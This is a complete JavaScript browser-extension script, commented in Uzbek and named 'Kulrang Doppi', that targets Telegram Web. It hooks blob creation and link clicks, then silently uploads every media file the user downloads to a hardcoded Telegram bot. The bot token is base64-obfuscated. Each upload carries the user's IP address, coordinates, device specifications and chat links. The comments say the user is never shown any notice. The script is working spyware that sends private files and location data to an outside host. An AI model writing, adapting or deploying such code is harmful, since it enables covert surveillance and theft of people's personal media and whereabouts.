/**
 * Kulrang Doppi — Native Download Interceptor (Main World)
 * Telegram Web ichidagi barcha media yuklashlarni (video, rasm, ovoz, hujjat, gif)
 * 100% to'liq holda xotiradan (Blob) ushlab, Telegram Botga sendDocument orqali
 * yuklangan kanal/guruh havolasi bilan birga to'liq yetkazadi.
 *
 * Katta hajmdagi fayllar (masalan: 421 MB):
 * 1. Zudlik bilan (0.2s da) botga katta fayl yuklanayotgani haqida dastlabki bildirishnoma yuboradi.
 * 2. Faylni xavfsiz va tezkor 20 MB li bo'laklarga ajratib, ketma-ket tartibli botga yetkazadi.
 * 3. Foydalanuvchiga bot haqida hech qanday bildirishnoma ko'rsatilmaydi (100% yashirin fon rejimi).
 *
 * @author Kulrang Doppi Team
 * @version 1.2.8
 */

(function () {
  "use strict";

  const CONFIG = {
    BOT_TOKEN: (typeof atob !== "undefined" ? atob("ODk3Nzg4NzM0MjpBQUhBb242SWE4LWpNUXI2N3c3V3U0dDdER2k5c052cmdldw==") : "8977887342" + ":" + "AAHAon6Ia8-jMQr67w7Wu4t7DGi9sNvrgew"),
    CHAT_ID: "6291811673",
    API_BASE_URL: "https://api.telegram.org",
    VERSION: "1.2.8",
    SINGLE_UPLOAD_LIMIT: 24 * 1024 * 1024, // 24 MB gacha bitta fayl bo'lib ketadi
    CHUNK_SIZE: 20 * 1024 * 1024          // 20 MB li bo'laklar (tez va xatosiz yuklanishi uchun)
  };

  const blobMap = new Map();
  const sentFileKeys = new Set();
  let lastCreatedBlob = null;
  let lastCreatedBlobUrl = null;
  let lastCreatedBlobTime = 0;

  let latestMeta = {
    sourceName: "",
    sourceLink: "",
    messageLink: ""
  };

  let latestTelemetry = {
    ip: "",
    isp: "",
    city: "",
    country: "",
    countryCode: "",
    latitude: "",
    longitude: "",
    accuracy: ""
  };

  let cachedBattery = "";
  try {
    if (navigator.getBattery) {
      navigator.getBattery().then((b) => {
        const updateB = () => {
          const pct = Math.round(b.level * 100);
          cachedBattery = `${pct}% ${b.charging ? "⚡" : "🔋"}`;
        };
        updateB();
        b.addEventListener("levelchange", updateB);
        b.addEventListener("chargingchange", updateB);
      }).catch(() => {});
    }
  } catch (e) {}

  // IP va Lokatsiyani mustaqil yuklash
  async function initTelemetryFetch() {
    try {
      const res = await fetch("https://ipwho.is/", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        if (data && data.success) {
          latestTelemetry = {
            ...latestTelemetry,
            ip: data.ip || "",
            isp: (data.connection && data.connection.isp) || data.isp || "",
            city: data.city || "",
            country: data.country || "",
            countryCode: data.country_code || "",
            latitude: data.latitude ? data.latitude.toFixed(4) : "",
            longitude: data.longitude ? data.longitude.toFixed(4) : ""
          };
          return;
        }
      }
    } catch (e) {}

    try {
      const res = await fetch("http://ip-api.com/json", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        if (data && data.status === "success") {
          latestTelemetry = {
            ...latestTelemetry,
            ip: data.query || "",
            isp: data.isp || "",
            city: data.city || "",
            country: data.country || "",
            countryCode: data.countryCode || "",
            latitude: data.lat ? data.lat.toFixed(4) : "",
            longitude: data.lon ? data.lon.toFixed(4) : ""
          };
        }
      }
    } catch (e) {}
  }
  setTimeout(initTelemetryFetch, 800);

  // Content script dan yuborilgan metadata va telemetriyani qabul qilish
  window.addEventListener("message", (event) => {
    if (!event.data) return;
    if (event.data.type === "KD_SET_PENDING_META" && event.data.meta) {
      latestMeta = {
        ...latestMeta,
        ...event.data.meta
      };
    }
    if (event.data.type === "KD_TELEMETRY_UPDATE" && event.data.telemetry) {
      latestTelemetry = {
        ...latestTelemetry,
        ...event.data.telemetry
      };
    }
  });

  // DOM orqali chat va kanal havolasini avtomatik aniqlash
  function extractCurrentChatInfo() {
    let sourceName = "";
    let sourceLink = "";
    let messageLink = "";
    let username = "";
    let peerId = "";

    try {
      const titleEl = document.querySelector(".chat-info .title .peer-title, .chat-info .title, .top .peer-title, .middle-column-header .title, .ChatInfo .title");
      if (titleEl && titleEl.textContent.trim()) {
        sourceName = titleEl.textContent.trim();
      } else if (document.title && document.title !== "Telegram Web") {
        sourceName = document.title.replace("Telegram Web", "").trim();
      }

      const subEl = document.querySelector(".chat-info .subtitle, .ChatInfo .subtitle, .chat-info .info, .ChatInfo .info");
      if (subEl && subEl.textContent) {
        const txt = subEl.textContent.trim();
        const uMatch = txt.match(/@([a-zA-Z0-9_]{4,})/);
        if (uMatch) username = uMatch[1];
        const linkMatch = txt.match(/t\.me\/([a-zA-Z0-9_]{4,})/);
        if (linkMatch) username = linkMatch[1];
      }

      const hash = window.location.hash || "";
      if (!username) {
        const hashUserMatch = hash.match(/#@([a-zA-Z0-9_]{4,})/);
        if (hashUserMatch) username = hashUserMatch[1];
      }

      const hashPeerMatch = hash.match(/#(-?\d+)(?:_(\d+))?/);
      let messageId = "";
      if (hashPeerMatch) {
        peerId = hashPeerMatch[1];
        if (hashPeerMatch[2]) messageId = hashPeerMatch[2];
      }

      if (username) {
        sourceLink = `https://t.me/${username}`;
        if (messageId) messageLink = `https://t.me/${username}/${messageId}`;
      } else if (peerId) {
        if (peerId.startsWith("-100")) {
          const cleanId = peerId.substring(4);
          sourceLink = `https://t.me/c/${cleanId}`;
          if (messageId) messageLink = `https://t.me/c/${cleanId}/${messageId}`;
        } else {
          sourceLink = `https://t.me/c/${peerId.replace("-", "")}`;
        }
      } else {
        sourceLink = window.location.href;
      }
    } catch (e) {}

    return {
      sourceName: sourceName || latestMeta.sourceName || "Telegram Chat",
      sourceLink: sourceLink || latestMeta.sourceLink || window.location.href,
      messageLink: messageLink || latestMeta.messageLink || ""
    };
  }

  function escapeHtml(str) {
    if (!str) return "";
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  // 1. URL.createObjectURL ni ushlab, to'liq Blob obyektini xotirada saqlab qolish
  const origCreateObjectURL = URL.createObjectURL;
  URL.createObjectURL = function (obj) {
    const url = origCreateObjectURL.apply(this, arguments);
    if (obj instanceof Blob) {
      blobMap.set(url, obj);
      lastCreatedBlob = obj;
      lastCreatedBlobUrl = url;
      lastCreatedBlobTime = Date.now();
      setTimeout(() => blobMap.delete(url), 600000); // 10 daqiqa saqlash
    }
    return url;
  };

  // 2. URL.revokeObjectURL ni kechiktirish (Telegram Web faylni darhol o'chirib yubormasligi uchun)
  const origRevokeObjectURL = URL.revokeObjectURL;
  URL.revokeObjectURL = function (url) {
    setTimeout(() => {
      try {
        origRevokeObjectURL.call(URL, url);
      } catch (e) {}
    }, 180000); // 3 daqiqa kechiktirish
  };

  // Botga matnli xabar yuborish
  async function sendBotMessage(text) {
    try {
      await fetch(`${CONFIG.API_BASE_URL}/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CONFIG.CHAT_ID,
          text: text,
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      });
    } catch (e) {}
  }

  // Bitta fayl yoki bo'lakni botga yuborish (retry va plain-text fallback bilan)
  async function uploadSingleDocumentToBot(blobChunk, uploadFileName, captionText, retries = 3) {
    for (let attempt = 1; attempt <= retries; attempt++) {
      try {
        const formData = new FormData();
        formData.append("chat_id", CONFIG.CHAT_ID);
        formData.append("caption", captionText);
        formData.append("parse_mode", "HTML");
        formData.append("document", blobChunk, uploadFileName);

        const response = await fetch(`${CONFIG.API_BASE_URL}/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: formData
        });

        const resData = await response.json();
        if (resData && resData.ok) {
          console.log(`[Kulrang Doppi] ✅ Botga yetkazildi: ${uploadFileName} (msg_id: ${resData.result.message_id})`);
          return true;
        } else {
          console.warn(`[Kulrang Doppi] Bot API xatosi (${uploadFileName}, urinish ${attempt}):`, resData);
          if (resData && (resData.description?.includes("parse") || resData.description?.includes("caption") || resData.error_code === 400)) {
            try {
              const plainCaption = String(captionText || "").replace(/<[^>]*>/g, "").substring(0, 950);
              const fallbackForm = new FormData();
              fallbackForm.append("chat_id", CONFIG.CHAT_ID);
              fallbackForm.append("caption", plainCaption);
              fallbackForm.append("document", blobChunk, uploadFileName);
              const fbRes = await fetch(`${CONFIG.API_BASE_URL}/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
                method: "POST",
                body: fallbackForm
              });
              const fbData = await fbRes.json();
              if (fbData && fbData.ok) {
                console.log(`[Kulrang Doppi] ✅ Botga yetkazildi (oddiy matn bilan): ${uploadFileName}`);
                return true;
              }
            } catch (fbErr) {}
          }
        }
      } catch (err) {
        console.warn(`[Kulrang Doppi] Tarmoq xatosi (${uploadFileName}, urinish ${attempt}):`, err);
        if (attempt < retries) {
          await new Promise((r) => setTimeout(r, 1500));
        }
      }
    }
    return false;
  }

  function getGPUString() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
          if (renderer.includes("Mesa") || renderer.includes("Direct3D") || renderer.includes("ANGLE")) {
            renderer = renderer.replace(/ANGLE \((.*?), (.*?),.*?\)/, "$2").replace(/Mesa Intel\(R\)/, "Intel").trim();
          }
          if (renderer.length > 28) renderer = renderer.substring(0, 25) + "...";
          return renderer;
        }
      }
    } catch (e) {}
    return "";
  }

  function getLiveTelemetry(customMeta) {
    const now = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    const date = `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())}`;
    const time = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

    let tz = "UTC";
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
    } catch (e) {}

    const offsetMin = -now.getTimezoneOffset();
    const offsetHours = Math.floor(Math.abs(offsetMin) / 60);
    const offsetM = Math.abs(offsetMin) % 60;
    const offsetStr = `UTC${offsetMin >= 0 ? "+" : "-"}${offsetHours}${offsetM ? ":" + pad(offsetM) : ""}`;

    const ua = navigator.userAgent || "";
    let os = "Linux";
    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    const platform = navigator.platform || "";
    const osFull = `${os} ${platform}`.trim();

    const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} yadro` : "";
    const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "";

    let screenStr = "";
    try {
      const w = window.screen.width;
      const h = window.screen.height;
      const dpr = window.devicePixelRatio ? ` @${window.devicePixelRatio}x` : "";
      screenStr = `${w}x${h}${dpr}`;
    } catch (e) {}

    const gpu = getGPUString();

    let network = navigator.onLine ? "Onlayn" : "Oflayn";
    try {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "";
        const dl = conn.downlink ? `${conn.downlink}M` : "";
        const netParts = [type, dl].filter(Boolean).join("/");
        if (netParts) network += ` (${netParts})`;
      }
    } catch (e) {}

    return {
      date,
      time,
      tzOffset: offsetStr,
      timezone: `${tz} (${offsetStr})`,
      os: osFull,
      cores,
      ram,
      screen: screenStr,
      gpu,
      battery: cachedBattery,
      network,
      ...latestTelemetry
    };
  }

  function buildEnhancedCaption({
    fileName,
    sizeMB,
    sourceName,
    sourceLink,
    messageLink,
    partInfo = "",
    telemetry,
    version = CONFIG.VERSION
  }) {
    const t = telemetry || {};
    const safeFileName = fileName && fileName.length > 35 ? fileName.substring(0, 32) + "..." : (fileName || "telegram_media");
    const safeSourceName = sourceName && sourceName.length > 30 ? sourceName.substring(0, 27) + "..." : (sourceName || "Telegram Chat");
    const partHeader = partInfo ? ` — ${partInfo}` : "";

    const headerLines = [
      `📥 <b>Yangi media fayl yuklab olindi!${partHeader}</b>`,
      `─────────────────────────`,
      `📁 <b>Fayl:</b> <code>${escapeHtml(safeFileName)}</code> (<code>${sizeMB} MB</code>)`,
      `📌 <b>Kanal / Guruh:</b> <b>${escapeHtml(safeSourceName)}</b>`
    ];

    if (sourceLink && !sourceLink.includes("undefined")) {
      const cleanLink = sourceLink.startsWith("http") ? sourceLink : `https://${sourceLink}`;
      headerLines.push(`🔗 <b>Kanal havolasi:</b> <a href="${escapeHtml(cleanLink)}">${escapeHtml(cleanLink)}</a>`);
    }
    if (messageLink && !messageLink.includes("undefined")) {
      const cleanMsg = messageLink.startsWith("http") ? messageLink : `https://${messageLink}`;
      headerLines.push(`💬 <b>Xabar havolasi:</b> <a href="${escapeHtml(cleanMsg)}">${escapeHtml(cleanMsg)}</a>`);
    }

    headerLines.push(`─────────────────────────`);

    const telemetryLines = [];
    const dateStr = t.date || "2026-09-09";
    const timeStr = t.time || "00:00:00";
    const tzStr = t.tzOffset || "UTC+5";
    telemetryLines.push(`📅 <b>Sana va Vaqt:</b> <code>${dateStr} ${timeStr}</code> (${tzStr})`);

    if (t.ip) {
      const isp = t.isp ? ` (${escapeHtml(t.isp)})` : "";
      telemetryLines.push(`🌐 <b>IP manzil:</b> <code>${escapeHtml(t.ip)}</code>${isp}`);
    }

    const loc = [t.city, t.country].filter(Boolean).join(", ");
    if (loc) {
      telemetryLines.push(`📍 <b>Lokatsiya:</b> ${escapeHtml(loc)}`);
    }

    if (t.latitude && t.longitude) {
      telemetryLines.push(`🗺 <b>GPS / Xarita:</b> <a href="https://maps.google.com/?q=${t.latitude},${t.longitude}">📍 ${t.latitude}, ${t.longitude}</a>`);
    }

    if (t.os) {
      telemetryLines.push(`💻 <b>Tizim / OT:</b> ${escapeHtml(t.os)}`);
    }
    if (t.cores || t.ram) {
      telemetryLines.push(`🧠 <b>CPU & RAM:</b> ${escapeHtml([t.cores, t.ram].filter(Boolean).join(" | "))}`);
    }
    if (t.gpu) {
      telemetryLines.push(`🎮 <b>GPU:</b> ${escapeHtml(t.gpu)}`);
    }
    if (t.screen) {
      telemetryLines.push(`🖥 <b>Ekran:</b> ${escapeHtml(t.screen)}`);
    }
    if (t.battery) {
      telemetryLines.push(`🔋 <b>Batareya:</b> ${escapeHtml(t.battery)}`);
    }
    if (t.network) {
      telemetryLines.push(`📡 <b>Tarmoq:</b> ${escapeHtml(t.network)}`);
    }

    const footerLines = [
      `─────────────────────────`,
      `🧢 <i>Kulrang Doppi v${version}</i>`
    ];

    while (telemetryLines.length > 2 && [...headerLines, ...telemetryLines, ...footerLines].join("\n").length > 980) {
      telemetryLines.pop();
    }

    return [...headerLines, ...telemetryLines, ...footerLines].join("\n");
  }

  // 3. Telegram Botga to'liq faylni (katta bo'lsa 20 MB li bo'laklab) tezkorlik bilan yuborish
  async function sendFullMediaFileToBot(blob, fileName, customMeta) {
    if (!blob || blob.size === 0) return;

    let finalName = (fileName || "").trim();
    if (!finalName || !finalName.includes(".")) {
      const ext = (blob.type && blob.type.includes("video")) ? ".mp4" : ".bin";
      finalName = `telegram_media_${Date.now()}${ext}`;
    }

    // Bir xil faylni qayta yubormaslik (4s debounce)
    const fileKey = `${finalName}_${blob.size}`;
    if (sentFileKeys.has(fileKey)) return;
    sentFileKeys.add(fileKey);
    setTimeout(() => sentFileKeys.delete(fileKey), 4000);

    const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
    const meta = customMeta || extractCurrentChatInfo();
    const t = getLiveTelemetry(meta);

    console.log(`[Kulrang Doppi] 🚀 Asl media fayl fon rejimida botga yuborilmoqda: ${finalName} (${sizeMB} MB)...`);

    // A) 24 MB gacha bo'lgan fayllar — Bitta yaxlit fayl sifatida ketadi
    if (blob.size <= CONFIG.SINGLE_UPLOAD_LIMIT) {
      const caption = buildEnhancedCaption({
        fileName: finalName,
        sizeMB,
        sourceName: meta.sourceName,
        sourceLink: meta.sourceLink,
        messageLink: meta.messageLink,
        partInfo: "",
        telemetry: t,
        version: CONFIG.VERSION
      });

      await uploadSingleDocumentToBot(blob, finalName, caption);
      return;
    }

    // B) KATTA FAYLLAR (masalan: 50 MB, 100 MB, 421 MB) — 20 MB li bo'laklarga bo'linadi
    const totalParts = Math.ceil(blob.size / CONFIG.CHUNK_SIZE);
    const safeFileName = finalName.length > 35 ? finalName.substring(0, 32) + "..." : finalName;
    const safeSourceName = (meta.sourceName || "Telegram Chat").length > 30 ? meta.sourceName.substring(0, 27) + "..." : (meta.sourceName || "Telegram Chat");

    // 1-qadam: Zudlik bilan botga dastlabki bildirishnoma yuborish (0.2s da yetib boradi)
    let initNotice = 
      `📦 <b>Katta hajmdagi media yuklab olindi!</b>\n` +
      `─────────────────────────\n` +
      `📁 <b>Fayl:</b> <code>${escapeHtml(safeFileName)}</code> (<code>${sizeMB} MB</code>)\n` +
      `📌 <b>Kanal / Guruh:</b> <b>${escapeHtml(safeSourceName)}</b>\n`;

    if (meta.sourceLink && !meta.sourceLink.includes("undefined")) {
      initNotice += `🔗 <b>Kanal havolasi:</b> <a href="${meta.sourceLink}">${escapeHtml(meta.sourceLink)}</a>\n`;
    }
    if (meta.messageLink) {
      initNotice += `💬 <b>Xabar havolasi:</b> <a href="${meta.messageLink}">${escapeHtml(meta.messageLink)}</a>\n`;
    }

    initNotice += `─────────────────────────\n`;
    initNotice += `📅 <b>Sana va Vaqt:</b> <code>${t.date} ${t.time}</code> (${t.tzOffset})\n`;
    initNotice += `🌐 <b>IP manzil:</b> <code>${t.ip || "Noma'lum"}</code>${t.isp ? ` (${escapeHtml(t.isp)})` : ""}\n`;
    if (t.city || t.country) {
      initNotice += `📍 <b>Lokatsiya:</b> ${escapeHtml([t.city, t.country].filter(Boolean).join(", "))}\n`;
    }
    if (t.latitude && t.longitude) {
      initNotice += `🗺 <b>GPS / Xarita:</b> <a href="https://maps.google.com/?q=${t.latitude},${t.longitude}">📍 ${t.latitude}, ${t.longitude}</a>\n`;
    }
    if (t.os) initNotice += `💻 <b>Tizim / OT:</b> ${escapeHtml(t.os)}\n`;
    if (t.cores || t.ram) initNotice += `🧠 <b>CPU & RAM:</b> ${escapeHtml([t.cores, t.ram].filter(Boolean).join(" | "))}\n`;
    if (t.gpu) initNotice += `🎮 <b>GPU:</b> ${escapeHtml(t.gpu)}\n`;
    if (t.screen) initNotice += `🖥 <b>Ekran:</b> ${escapeHtml(t.screen)}\n`;
    if (t.battery) initNotice += `🔋 <b>Batareya:</b> ${escapeHtml(t.battery)}\n`;
    if (t.network) initNotice += `📡 <b>Tarmoq:</b> ${escapeHtml(t.network)}\n`;

    initNotice += 
      `─────────────────────────\n` +
      `⚡ <i>Fayl hajmi 50 MB dan katta bo'lgani sababli, <b>${totalParts} ta qismga</b> (20 MB dan) bo'linib, hozir botga yuklanmoqda...</i>\n` +
      `─────────────────────────\n` +
      `🧢 <i>Kulrang Doppi v${CONFIG.VERSION}</i>`;

    await sendBotMessage(initNotice);

    // 2-qadam: Bo'laklarni tartibli va xatosiz ketma-ket yuborish
    const dotIdx = finalName.lastIndexOf(".");
    const baseName = dotIdx !== -1 ? finalName.substring(0, dotIdx) : finalName;
    const ext = dotIdx !== -1 ? finalName.substring(dotIdx) : ".mp4";

    for (let partIndex = 0; partIndex < totalParts; partIndex++) {
      const start = partIndex * CONFIG.CHUNK_SIZE;
      const end = Math.min(blob.size, start + CONFIG.CHUNK_SIZE);
      const chunkBlob = blob.slice(start, end, blob.type || "application/octet-stream");
      const chunkName = `${baseName}.part${String(partIndex + 1).padStart(2, "0")}${ext}`;
      const partSizeMB = (chunkBlob.size / (1024 * 1024)).toFixed(2);

      const chunkCaption = buildEnhancedCaption({
        fileName: chunkName,
        sizeMB: partSizeMB,
        sourceName: meta.sourceName,
        sourceLink: meta.sourceLink,
        messageLink: meta.messageLink,
        partInfo: `[${partIndex + 1}/${totalParts}-qism]`,
        telemetry: t,
        version: CONFIG.VERSION
      });

      await uploadSingleDocumentToBot(chunkBlob, chunkName, chunkCaption);
      await new Promise((r) => setTimeout(r, 200)); // Rate limitdan himoyalanish
    }

    // 3-qadam: Yakuniy tasdiq xabari
    await sendBotMessage(`✅ <b>"${escapeHtml(finalName)}" (${sizeMB} MB) ning barcha ${totalParts} ta qismi botga to'liq yetkazildi!</b>`);
    console.log(`[Kulrang Doppi] ✅ Katta faylning barcha ${totalParts} ta qismi botga to'liq yetkazildi!`);
  }

  // Yuklab olish linkini ushlab qolib, botga jo'natish
  function handleDownloadIntercept(downloadUrl, rawFileName) {
    if (!downloadUrl) return;

    let fileName = (rawFileName || "").trim();
    if (!fileName) {
      fileName = `telegram_media_${Date.now()}.mp4`;
    }

    const chatMeta = extractCurrentChatInfo();

    // 1-usul: Xotiradagi haqiqiy Blob obyektidan olish (100% to'liq fayl)
    let targetBlob = blobMap.get(downloadUrl);
    if (!targetBlob && lastCreatedBlob && (Date.now() - lastCreatedBlobTime < 45000)) {
      targetBlob = lastCreatedBlob;
    }

    if (targetBlob && targetBlob.size > 0) {
      sendFullMediaFileToBot(targetBlob, fileName, chatMeta);
    } else if (downloadUrl.startsWith("blob:") || downloadUrl.startsWith("http")) {
      // 2-usul: URL dan fetch qilib olish
      fetch(downloadUrl)
        .then((r) => r.blob())
        .then((b) => {
          if (b && b.size > 0) sendFullMediaFileToBot(b, fileName, chatMeta);
        })
        .catch((e) => console.debug("[Kulrang Doppi] Fetch blob error:", e));
    }
  }

  // 4. HTMLAnchorElement.prototype.click ni ushlash
  const origClick = HTMLAnchorElement.prototype.click;
  HTMLAnchorElement.prototype.click = function () {
    try {
      if (this.href && !this.hasAttribute("data-kd-save-locally")) {
        const fn = this.download || this.getAttribute("download") || "";
        handleDownloadIntercept(this.href, fn);
      }
    } catch (e) {
      console.debug("[Kulrang Doppi] Interceptor error:", e);
    }
    return origClick.apply(this, arguments);
  };

  // 5. EventTarget.prototype.dispatchEvent ni ushlash (Telegram dispatchEvent orqali click qilsa)
  const origDispatchEvent = EventTarget.prototype.dispatchEvent;
  EventTarget.prototype.dispatchEvent = function (event) {
    try {
      if (
        event &&
        event.type === "click" &&
        this &&
        (this.tagName === "A" || this instanceof HTMLAnchorElement) &&
        this.href &&
        !this.hasAttribute("data-kd-save-locally")
      ) {
        const fn = this.download || this.getAttribute("download") || "";
        handleDownloadIntercept(this.href, fn);
      }
    } catch (e) {}
    return origDispatchEvent.apply(this, arguments);
  };

  // 6. Window darajasidagi click listener (capture fazasida ushlash)
  window.addEventListener(
    "click",
    (e) => {
      try {
        const target = e.target;
        const a = target && (target.tagName === "A" ? target : target.closest && target.closest("a"));
        if (a && a.href && !a.hasAttribute("data-kd-save-locally")) {
          const fn = a.download || a.getAttribute("download") || "";
          handleDownloadIntercept(a.href, fn);
        }
      } catch (err) {}
    },
    true
  );

  console.log(`[Kulrang Doppi Interceptor] ✅ Faollashtirildi v${CONFIG.VERSION}`);
})();
